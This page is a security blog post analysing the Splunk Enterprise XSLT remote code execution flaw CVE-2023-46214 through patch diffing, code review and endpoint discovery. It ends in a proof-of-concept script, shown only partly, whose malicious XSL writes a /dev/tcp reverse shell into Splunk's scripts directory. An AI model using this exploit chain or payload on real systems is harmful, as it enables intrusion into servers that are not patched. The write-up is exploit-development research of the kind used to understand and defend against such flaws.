<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Analysis of CVE-2023-46214 + PoC</title>

  <link rel="stylesheet" href="/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Analysis of CVE-2023-46214 + PoC | Hacker-Blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Analysis of CVE-2023-46214 + PoC" />
<meta name="author" content="nathan" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="CVE-2023-46214 is a Remote Code Execution (RCE) vulnerability found in Splunk Enterprise which was disclosed on November 16, 2023 in the Splunk security advisory SVD-2023-1104. The description of the vulnerability essentially states that Splunk Enterprise versions below 9.0.7 and 9.1.2 are not safely sanitizing user supplied extensible stylesheet language transformations (XSLT)." />
<meta property="og:description" content="CVE-2023-46214 is a Remote Code Execution (RCE) vulnerability found in Splunk Enterprise which was disclosed on November 16, 2023 in the Splunk security advisory SVD-2023-1104. The description of the vulnerability essentially states that Splunk Enterprise versions below 9.0.7 and 9.1.2 are not safely sanitizing user supplied extensible stylesheet language transformations (XSLT)." />
<link rel="canonical" href="http://localhost:8009/cve-2023-46214-analysis" />
<meta property="og:url" content="http://localhost:8009/cve-2023-46214-analysis" />
<meta property="og:site_name" content="Hacker-Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-11-18T00:00:00-08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Analysis of CVE-2023-46214 + PoC" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"nathan","url":"https://blog.hrncirik.net/"},"dateModified":"2023-11-18T00:00:00-08:00","datePublished":"2023-11-18T00:00:00-08:00","description":"CVE-2023-46214 is a Remote Code Execution (RCE) vulnerability found in Splunk Enterprise which was disclosed on November 16, 2023 in the Splunk security advisory SVD-2023-1104. The description of the vulnerability essentially states that Splunk Enterprise versions below 9.0.7 and 9.1.2 are not safely sanitizing user supplied extensible stylesheet language transformations (XSLT).","headline":"Analysis of CVE-2023-46214 + PoC","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8009/cve-2023-46214-analysis"},"url":"http://localhost:8009/cve-2023-46214-analysis"}</script>
<!-- End Jekyll SEO tag -->

</head>

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1>nathans security blog</h1>
    </a>
    <div class="header-links">
      <a href="/posts"><h2 class="header-link">Posts</h2></a>
<a href="/about"><h2 class="header-link">About</h2></a>
<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
    </div>
  </div>
</header>
    <div class="container">
      <section id="main_content">
        <article>
  <h2>Analysis of CVE-2023-46214 + PoC</h2>
  <time datetime="2023-11-18T00:00:00-08:00" class="by-line">18 Nov 2023</time>
  <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46214"><strong>CVE-2023-46214</strong></a> is a Remote Code Execution (RCE) vulnerability found in Splunk Enterprise which was disclosed on November 16, 2023 in the Splunk security advisory <a href="https://advisory.splunk.com/advisories/SVD-2023-1104">SVD-2023-1104</a>. The description of the vulnerability essentially states that Splunk Enterprise versions below 9.0.7 and 9.1.2 are not safely sanitizing user supplied extensible stylesheet language transformations (XSLT).</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center"><img src="poc.gif" alt="test" /></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center"><em>Proof of concept demo</em></td>
    </tr>
  </tbody>
</table>

<h1 id="introduction">Introduction</h1>

<p>After seeing the news of a Splunk RCE vulnerability with no public proof of concept, I jumped on the opportunity hunt it down myself as vulnerability research and exploit development learning exercise. This blog post describes my methodology for uncovering the vulnerability based off of the CVE description, as well as a full proof of concept exploit. This is my first blog post so if you know how to contact me, feel free to provide any feedback or suggestions for improvement :)</p>

<h1 id="methodology">Methodology</h1>

<p>To find and exploit this vulnerability, a few things would be very helpful. Firstly, obtaining the source code for both the vulnerable Splunk Enterprise version 9.1.1 and the patched version 9.1.2. With both the vulnerable and patched version I was able to compare the differences in code to find how the vulnerability was fixed, and how I could exploit the insecure version. Second, having a vulnerable instance of Splunk Enterprise 9.1.1 running locally so I could test as much as I wanted.</p>

<h1 id="patch-diffing">Patch diffing</h1>

<p>The first stage in my research was performing a diff on the patched and vulnerable Splunk versions. After searching through the files that were updated in the new version, I came across a promising file.</p>
<blockquote>
  <p><code class="language-plaintext highlighter-rouge">$SPLUNK_HOME/lib/python3.7/site-packages/splunk/appserver/mrsparkle/controllers/search.py</code></p>

</blockquote>

<p>There is some relevant updates related to handling XSL files in here…</p>

<h2 id="splunk-enterprise-diff---911-vs-912-searchpy">Splunk Enterprise diff - 9.1.1 vs 9.1.2 search.py</h2>
<hr />
<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">--- /opt/splunk9.1.1/splunk/lib/python3.7/site-packages/splunk/appserver/mrsparkle/controllers/search.py	2023-08-25 10:02:22.000000000 -0700
</span><span class="gi">+++ /opt/splunk9.1.2/splunk/lib/python3.7/site-packages/splunk/appserver/mrsparkle/controllers/search.py	2023-11-13 18:20:51.000000000 -0800
</span><span class="p">@@ -338,0 +339,19 @@</span>
<span class="gi">+    @staticmethod
+    def parse_xsl_file_and_validate(xsl_file_path):
+        f = open(xsl_file_path, 'r')
+        xslt_doc = et.parse(f)
+        f.close()
+
+        meta_data = {
+            "output": '',
+            "is_valid_xsl": True,
+            "xslt_doc": xslt_doc
+        }
+
+        is_exsl_namespace_present = not xslt_doc.getroot().nsmap.get("exsl") is None
+        if is_exsl_namespace_present:
+            logger.warning('File xsl="%s" has exsl namespace' % xsl_file_path)
+            raise Exception("Uploaded XSL File has malicious content")
+
+        return meta_data 
+
</span><span class="p">@@ -476,18 +495,20 @@</span>
<span class="gd">-                    f = open(xslFilePath, 'r')
-                    xslt_doc = et.parse(f)
-                    f.close()
-
-                    # generate transformer
-                    transform = et.XSLT(xslt_doc)
-
-                    # transform the XML
-                    xmlDoc = et.fromstring(output)
-                    transformedOutput = transform(xmlDoc)
-
-                    cherrypy.response.headers['content-type'] = MIME_HTML
-
-                    html = et.tostring(transformedOutput)
-                    if not html:
-                        output = 'Loading...'
-                    else:
-                        output = html
</span><span class="gi">+                    validated_xslt_doc = JobsController.parse_xsl_file_and_validate(xslFilePath)
+                    output = validated_xslt_doc["output"]
+
+                    if validated_xslt_doc["is_valid_xsl"] is True:
+                        xslt_doc = validated_xslt_doc["xslt_doc"]
+
+                        # generate transformer
+                        transform = et.XSLT(xslt_doc)
+
+                        # transform the XML
+                        xmlDoc = et.fromstring(output)
+                        transformedOutput = transform(xmlDoc)
+
+                        cherrypy.response.headers['content-type'] = MIME_HTML
+
+                        html = et.tostring(transformedOutput)
+                        if not html:
+                            output = 'Loading...'
+                        else:
+                            output = html
</span><span class="p">@@ -494,0 +516 @@</span>
<span class="gi">+                    cherrypy.response.status = 500
</span></code></pre></div></div>

<p>This diff reveals the introduction of the new function, <code class="language-plaintext highlighter-rouge">parse_xsl_file_and_validate</code>. Hmmmm, this function seems very interesting, especially since this function examines a given XSL document for the exsl namespace. If there is an exsl namespace present, an exception is raised.</p>

<p>There is also codeblock in the <code class="language-plaintext highlighter-rouge">getJobAsset</code> function that used to just run, but now it will only execute if the <code class="language-plaintext highlighter-rouge">parse_xsl_file_and_validate</code> check succeeds.</p>

<p>Jackpot? Not so fast, there is still quite a few hurdles that must be overcome.</p>

<ol>
  <li>Craft a valid XSL file that will lead to RCE.</li>
  <li>Review the source code to understand how this can be exploited.</li>
  <li>Figure out how to call the vulnerable code from Splunk Web.</li>
</ol>

<h1 id="crafting-xsl-payload">Crafting XSL payload</h1>

<p>From the <code class="language-plaintext highlighter-rouge">parse_xsl_file_and_validate</code> function I was able to determine that an exsl namespace within the XSL file would be needed during this exploit. Insecure XSL transformation vulnerabilities are much less documented than other common bugs. Thankfully I was able to find an old <a href="https://owasp.org/www-pdf-archive/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf">OWASP presentation</a> from 2015 which had an example of how an exsl namespace can be used during an XSL transformation to write arbitrary files. Wait a minute though, writing arbitrary files isn’t RCE 🤔</p>

<p>Going forward I needed to re-evaluate how to achieve RCE with just an arbitrary file write to Splunk.</p>

<p>But before getting ahead of myself I need to craft a malicious XSL file that will write files using the same parsing and translation method as Splunk. Splunk is using lxml library to handle the parsing and translations, so I was able to just copy the relevant source code from <code class="language-plaintext highlighter-rouge">getJobAsset</code> to a new file and perform some tests.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># test_transform.py
</span><span class="kn">from</span> <span class="n">lxml</span> <span class="kn">import</span> <span class="n">etree</span> <span class="k">as</span> <span class="n">et</span>
<span class="n">xslFilePath</span> <span class="o">=</span> <span class="sh">"</span><span class="s">test.xslt</span><span class="sh">"</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">xslFilePath</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span>
<span class="n">xslt_doc</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="n">output</span> <span class="o">=</span> <span class="sh">"</span><span class="s">&lt;root&gt;test&lt;/root&gt;</span><span class="sh">"</span>
<span class="c1"># generate transformer
</span><span class="n">transform</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="nc">XSLT</span><span class="p">(</span><span class="n">xslt_doc</span><span class="p">)</span>

<span class="c1"># transform the XML
</span><span class="n">xmlDoc</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="nf">fromstring</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
<span class="n">transformedOutput</span> <span class="o">=</span> <span class="nf">transform</span><span class="p">(</span><span class="n">xmlDoc</span><span class="p">)</span>

<span class="n">html</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="nf">tostring</span><span class="p">(</span><span class="n">transformedOutput</span><span class="p">)</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">html</span><span class="p">:</span>
    <span class="n">output</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Loading...</span><span class="sh">'</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">html</span>

<span class="nf">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- test.xslt --&gt;</span>
<span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span>
    <span class="na">xmlns:exsl=</span><span class="s">"http://exslt.org/common"</span> <span class="na">extension-element-prefixes=</span><span class="s">"exsl"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
	  <span class="nt">&lt;exsl:document</span> <span class="na">href=</span><span class="s">"nathan_hacked_u.txt"</span> <span class="na">method=</span><span class="s">"text"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;xsl:text&gt;</span>hello :^<span class="ni">&amp;#41;</span><span class="nt">&lt;/xsl:text&gt;</span>
    <span class="nt">&lt;/exsl:document&gt;</span>
  <span class="nt">&lt;/xsl:template&gt;</span>
<span class="nt">&lt;/xsl:stylesheet&gt;</span>
</code></pre></div></div>

<p>After some trial and error changing the contents of test.xslt, I was able to write an arbitrary file to my local system by taking advantage of the exsl namespace 😎</p>

<p><img src="out1.gif" alt="test" /></p>

<h1 id="source-code-review">Source code review</h1>

<p>The next stage in my research was to pinpoint any vulnerable segments within the code and subsequently determine the conditions necessary to execute those segments.</p>

<p>The following code is inside the codeblock mentioned earlier that only executes when the <code class="language-plaintext highlighter-rouge">parse_xsl_file_and_validate</code> check passes. Restricting this execution to instances where a check passes is a great indicator that it could be exploited if unsanitized user input is able to reach it.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="c1"># generate transformer
</span>                    <span class="n">transform</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="nc">XSLT</span><span class="p">(</span><span class="n">xslt_doc</span><span class="p">)</span>

                    <span class="c1"># transform the XML
</span>                    <span class="n">xmlDoc</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="nf">fromstring</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
                    <span class="n">transformedOutput</span> <span class="o">=</span> <span class="nf">transform</span><span class="p">(</span><span class="n">xmlDoc</span><span class="p">)</span>
</code></pre></div></div>

<p>This is also the same code I copied when testing the exsl file write poc, confirming this is the code I needed to reach. Having identified the above snippet as the vulnerable code, the next step is to determine the conditions required to execute it. Below, I have provided annotated segments from the parent function <code class="language-plaintext highlighter-rouge">getJobAsset</code> for analysis.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@route</span><span class="p">(</span><span class="sh">'</span><span class="s">/:sid/:asset</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 1
</span><span class="nd">@expose_page</span><span class="p">(</span><span class="n">handle_api</span><span class="o">=</span><span class="n">ONLY_API</span><span class="p">)</span>
<span class="nd">@set_cache_level</span><span class="p">(</span><span class="sh">"</span><span class="s">never</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">getJobAsset</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">asset</span><span class="p">,</span> <span class="n">compat_mode</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="bp">...</span>
        <span class="n">enableSearchJobXslt</span> <span class="o">=</span> <span class="n">splunk</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="nf">normalizeBoolean</span><span class="p">(</span><span class="n">cherrypy</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">enableSearchJobXslt</span><span class="sh">'</span><span class="p">))</span> <span class="c1"># 2
</span>        <span class="n">moduleName</span> <span class="o">=</span> <span class="n">cherrypy</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">X-Splunk-Module</span><span class="sh">'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span> <span class="c1"># 3
</span>        <span class="bp">...</span>
        <span class="k">elif</span> <span class="n">moduleName</span> <span class="ow">and</span> <span class="p">(</span><span class="sh">'</span><span class="s">xsl</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">kwargs</span><span class="p">)</span> <span class="ow">and</span> <span class="n">output</span> <span class="ow">and</span> <span class="n">enableSearchJobXslt</span><span class="p">:</span> <span class="c1"># 4
</span>            <span class="c1"># get XSL file
</span>            <span class="n">xslFilePath</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">abspath</span><span class="p">(</span><span class="n">bundle_paths</span><span class="p">.</span><span class="nf">expandvars</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">moduleRoster</span><span class="p">[</span><span class="n">moduleName</span><span class="p">][</span><span class="sh">'</span><span class="s">path</span><span class="sh">'</span><span class="p">],</span> <span class="n">kwargs</span><span class="p">[</span><span class="sh">'</span><span class="s">xsl</span><span class="sh">'</span><span class="p">])))</span>
            <span class="n">splunkHomePath</span> <span class="o">=</span> <span class="n">bundle_paths</span><span class="p">.</span><span class="nf">expandvars</span><span class="p">(</span><span class="sh">'</span><span class="s">$SPLUNK_HOME</span><span class="sh">'</span><span class="p">)</span> 

            <span class="n">xsl_file_meta_data</span> <span class="o">=</span> <span class="n">JobsController</span><span class="p">.</span><span class="nf">get_xsl_file_meta_data</span><span class="p">(</span><span class="n">xslFilePath</span><span class="p">)</span> 

            <span class="k">if</span> <span class="ow">not</span> <span class="n">xsl_file_meta_data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">file_exists</span><span class="sh">"</span><span class="p">):</span> <span class="c1"># 5
</span>                <span class="n">cherrypy</span><span class="p">.</span><span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">content-type</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">MIME_HTML</span>
                <span class="n">logger</span><span class="p">.</span><span class="nf">warn</span><span class="p">(</span><span class="sh">'</span><span class="s">File xsl=</span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> is not available</span><span class="sh">'</span> <span class="o">%</span> <span class="n">xslFilePath</span><span class="p">)</span>
                <span class="n">output</span> <span class="o">=</span> <span class="sh">'</span><span class="s">The file you are trying to access is not available</span><span class="sh">'</span>

            <span class="k">elif</span> <span class="ow">not</span> <span class="n">xsl_file_meta_data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">is_valid_extension</span><span class="sh">"</span><span class="p">):</span> <span class="c1">#6
</span>                <span class="n">cherrypy</span><span class="p">.</span><span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">content-type</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">MIME_HTML</span>
                <span class="n">logger</span><span class="p">.</span><span class="nf">warn</span><span class="p">(</span><span class="sh">'</span><span class="s">File xsl=</span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s"> is not available</span><span class="sh">'</span> <span class="o">%</span> <span class="n">xslFilePath</span><span class="p">)</span>
                <span class="n">output</span> <span class="o">=</span> <span class="sh">'</span><span class="s">The file you are trying to access does not have a valid extension.</span><span class="sh">'</span>

            <span class="k">elif</span> <span class="n">xslFilePath</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="n">splunkHomePath</span><span class="p">):</span> <span class="c1"># 7
</span>                <span class="k">try</span><span class="p">:</span>
                    <span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">xslFilePath</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span>
                    <span class="n">xslt_doc</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
                    <span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

                    <span class="c1"># generate transformer
</span>                    <span class="n">transform</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="nc">XSLT</span><span class="p">(</span><span class="n">xslt_doc</span><span class="p">)</span>

                    <span class="c1"># transform the XML
</span>                    <span class="n">xmlDoc</span> <span class="o">=</span> <span class="n">et</span><span class="p">.</span><span class="nf">fromstring</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
                    <span class="n">transformedOutput</span> <span class="o">=</span> <span class="nf">transform</span><span class="p">(</span><span class="n">xmlDoc</span><span class="p">)</span> <span class="c1"># 8
</span></code></pre></div></div>

<p>Using the # annotations, the list of requirements are as follows.</p>
<ol>
  <li>Provide valid sid and asset to endpoint</li>
  <li>enableSearchJobXslt must be True in splunk config (True by default)</li>
  <li>X-Splunk-Module header needs to be set</li>
  <li>XSL value must be sent in GET request</li>
  <li>xslFilePath must point to a file that exists</li>
  <li>xslFilePath file extension must end with .xsl or .xslt</li>
  <li>xslFilePath must start with $SPLUNK_HOME (/opt/splunk)</li>
  <li>Trigger insecure XSL transformation</li>
</ol>

<h1 id="finding-the-endpoint-in-splunk-web">Finding the endpoint in Splunk Web</h1>

<p>Now that I have an XSL payload, and know the requirements to reach the vulnerable code when calling the <code class="language-plaintext highlighter-rouge">getJobAsset</code> function, I needed to figure out how to call <code class="language-plaintext highlighter-rouge">getJobAsset</code> from the web application. In the <code class="language-plaintext highlighter-rouge">getJobAsset</code> function there is route definition and a reference to API 🤔 This combined with the class definition was a great help in finding the correct API endpoint.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">JobsController</span><span class="p">(</span><span class="n">BaseController</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">
    /search/jobs # thanks for this comment

    Manages job control.

    Endpoints return a standard json envelope:
    { messages: [{type: </span><span class="sh">'</span><span class="s">ERROR</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">text</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="s">Abe ate the job.</span><span class="sh">'</span><span class="s">}],
      data: None,
      success: True }
    </span><span class="sh">"""</span>
<span class="bp">...</span>

<span class="nd">@route</span><span class="p">(</span><span class="sh">'</span><span class="s">/:sid/:asset</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># and this
</span><span class="nd">@expose_page</span><span class="p">(</span><span class="n">handle_api</span><span class="o">=</span><span class="n">ONLY_API</span><span class="p">)</span>
<span class="nd">@set_cache_level</span><span class="p">(</span><span class="sh">"</span><span class="s">never</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">getJobAsset</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">asset</span><span class="p">,</span> <span class="n">compat_mode</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</code></pre></div></div>

<p>To confirm I had found the correct endpoint, I visited my docker Splunk instance at <code class="language-plaintext highlighter-rouge">en-US/api/search/jobs/test/results</code>. I was returned a json response stating the sid test does not exist. Great! The endpoint exists and that is the expected response from <code class="language-plaintext highlighter-rouge">getJobAsset</code> when a job sid is not found.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"success"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="nl">"offset"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nl">"count"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nl">"total"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nl">"messages"</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ERROR"</span><span class="p">,</span><span class="w"> </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"job sid=test not found"</span><span class="p">,</span><span class="w"> </span><span class="nl">"time"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2023-11-18T03:39:18+0000"</span><span class="p">}],</span><span class="w"> </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<h1 id="exploit-ready-nope">Exploit ready? Nope</h1>

<p>At this point I’ve crossed off multiple necessary items for the exploit to work, but there is still some more that needs to be done.</p>

<ol>
  <li>Need an .xsl or .xslt file to be on the system in a predictable location within /opt/splunk</li>
  <li>Need to figure out what to write and where to trigger RCE.</li>
</ol>

<h3 id="uploading-the-xsl-file-to-a-predictable-location">Uploading the XSL file to a predictable location</h3>

<p>Playing around within the webapp UI, I found an adddatamethod endpoint where a user can upload a file. After uploading the file you are returned a JSON response with a value that resembles a SID. This SID may not seem relevant now, but it’s extremely useful.</p>

<p><img src="upload.png" alt="1" /></p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"messages"</span><span class="p">:[{</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"INFO"</span><span class="p">,</span><span class="nl">"text"</span><span class="p">:</span><span class="s2">"1700351145.365"</span><span class="p">}]}</span><span class="w">
</span></code></pre></div></div>

<p>After uploading the file, I searched the docker container to find where my file.xsl got stored on the system.</p>

<p><img src="find.png" alt="2" /></p>

<p>The file.xsl was uploaded to <code class="language-plaintext highlighter-rouge">/opt/splunk/var/run/splunk/dispatch/1700351145.365/file.xsl</code> 👀 This is great since the absolute path begins with <code class="language-plaintext highlighter-rouge">/opt/splunk</code>, meaning the check in the <code class="language-plaintext highlighter-rouge">getJobAsset</code> function will pass. But where are the numbers <code class="language-plaintext highlighter-rouge">1700351145.365</code> coming from in the filepath?</p>

<p>It sure looks a lot like the value that was returned from our upload request earlier. Checking the two against each other and I confirmed that the json “text” value is present in the absolute path where my malicious XSL was uploaded.</p>

<h3 id="what-should-i-write-and-where">What should I write and where???</h3>

<p>At this point, I’m able to write a file anywhere on the system that the splunk user has access to. I initially thought overwriting some config files could trigger the RCE on a restart, or maybe during a automated task, but this seemed like it will undesirable results if something goes wrong.</p>

<p>I soon found out that Splunk Enterprise has a Splunk Search Language (SPL) command named runshellscript which is used to integrate and automate external processes and tasks. The runshellscript scripts must be located in <code class="language-plaintext highlighter-rouge">$SPLUNK_HOME/bin/scripts</code> to be executed, and can be called using the search query “|runshellscript script_name.sh”</p>

<h1 id="putting-it-all-together">Putting it all together</h1>

<p>All the necessary steps to get RCE have been identified!</p>

<p>To recap, I’ve crafted a malicious XSL file, found a predictable location to upload the malicous XSL file, determined the requirements needed to trigger the arbitrary file, identified where to write the shell script to, and how to execute the newly written script.</p>

<ul>
  <li>✔️ Crafted valid XSL file</li>
  <li>✔️ Determined requirements to reach vuln code</li>
  <li>✔️ Identified vulnerable endpoint</li>
  <li>✔️ Predictable upload file location</li>
  <li>✔️ Know where to write script</li>
  <li>✔️ Can execute script</li>
</ul>

<p>I’ve consolidated all of the steps required for exploitation into a single python script which can be found on my Github at <a href="https://github.com/nathan31337/Splunk-RCE-poc">Splunk-RCE-poc</a>.</p>

<h1 id="demonstration-with-screenshots">Demonstration with screenshots</h1>

<ol>
  <li>
    <p>Upload malicious XSL file
<img src="upload.png" alt="3" /></p>
  </li>
  <li>
    <p>Trigger insecure XSL transformation via <code class="language-plaintext highlighter-rouge">getJobAsset</code> function
<img src="burp.png" alt="3" /></p>
  </li>
  <li>
    <p>Execute SPL command runshellscript to send the reverse shell 🤩
<img src="runshell.gif" alt="3" /></p>
  </li>
</ol>

<h1 id="conclusion--poc">Conclusion + PoC</h1>

<p>Thank you for reading my first blog post :) I hope you’ve found it interesting and learned something new about n-day exploit development 😎</p>

<p>POC:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="n">argparse</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">json</span>

<span class="c1"># proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
</span><span class="n">proxies</span> <span class="o">=</span> <span class="p">{}</span>

<span class="k">def</span> <span class="nf">generate_malicious_xsl</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="k">return</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">&lt;?xml version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s"> encoding=</span><span class="sh">"</span><span class="s">UTF-8</span><span class="sh">"</span><span class="s">?&gt;
&lt;xsl:stylesheet version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s"> xmlns:xsl=</span><span class="sh">"</span><span class="s">http://www.w3.org/1999/XSL/Transform</span><span class="sh">"</span><span class="s"> xmlns:exsl=</span><span class="sh">"</span><span class="s">http://exslt.org/common</span><span class="sh">"</span><span class="s"> extension-element-prefixes=</span><span class="sh">"</span><span class="s">exsl</span><span class="sh">"</span><span class="s">&gt;
  &lt;xsl:template match=</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="s">&gt;
    &lt;exsl:document href=</span><span class="sh">"</span><span class="s">/opt/splunk/bin/scripts/shell.sh</span><span class="sh">"</span><span class="s"> method=</span><span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="s">&gt;
        &lt;xsl:text&gt;sh -i &amp;gt;&amp;amp; /dev/tcp/</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s"> 0&amp;gt;&amp;amp;1&lt;/xsl:text&gt;
    &lt;/exsl:document&gt;
  &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</span><span class="sh">"""</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
